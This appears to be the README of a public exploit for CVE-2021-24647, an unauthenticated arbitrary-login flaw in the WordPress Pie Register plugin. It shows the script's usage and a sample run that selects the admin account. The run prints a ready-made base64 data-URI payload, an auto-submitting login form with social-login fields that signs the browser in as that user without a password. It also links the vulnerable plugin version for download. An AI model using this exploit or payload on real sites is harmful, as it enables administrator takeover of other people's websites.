# CVE-2021-24647
CVE-2021-24647 Pie Register &lt; 3.7.1.6 - Unauthenticated Arbitrary Login

Info
---

```
usage: exploit.py [-h] -w URL [-p PATH]

options:
  -h, --help            show this help message and exit
  -w URL, --url URL     URL of the WordPress site
  -p PATH, --path PATH  Path of the Login Page /login/ or /pie-registration/
```

How to use
---


```
$ python3 exploit.py -w http://wordpress.lan
The plugin version is below 3.7.1.6.
The plugin version is 3.7.1.4
Select a user:
1. admin
Enter the user ID: 1

Boom we were able to login as admin copy and paste the following in to your browser and refresh and you will be logged in.

data:text/html;base64,PGh0bWw+PGJvZHk+CiAgICAgICAgICAgICAgICAgICAgIDxzY3JpcHQ+aGlzdG9yeS5wdXNoU3RhdGUoJycsICcnLCAnLycpOzwvc2NyaXB0PgogICAgICAgICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249Imh0dHA6Ly93b3JkcHJlc3MubGFuL2xvZ2luLyIgbWV0aG9kPSJQT1NUIj4KICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibG9nIiB2YWx1ZT0iYSIgLz4KICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icHdkIiB2YWx1ZT0iYSIgLz4KICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic29jaWFsJiM5NTtzaXRlIiB2YWx1ZT0idHJ1ZSIgLz4KICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlciYjOTU7aWQmIzk1O3NvY2lhbCYjOTU7c2l0ZSIgdmFsdWU9IjEiIC8+CiAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IndwJiM0NTtzdWJtaXQiIHZhbHVlPSJMb2cmIzMyO0luIiAvPgogICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0ZXN0Y29va2llIiB2YWx1ZT0iMSIgLz48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3VibWl0IHJlcXVlc3QiIC8+CiAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT48L2JvZHk+PC9odG1sPg==
```

Vulnerable Plugin Download
[https://downloads.wordpress.org/plugin/pie-register.3.7.1.4.zip](https://downloads.wordpress.org/plugin/pie-register.3.7.1.4.zip)

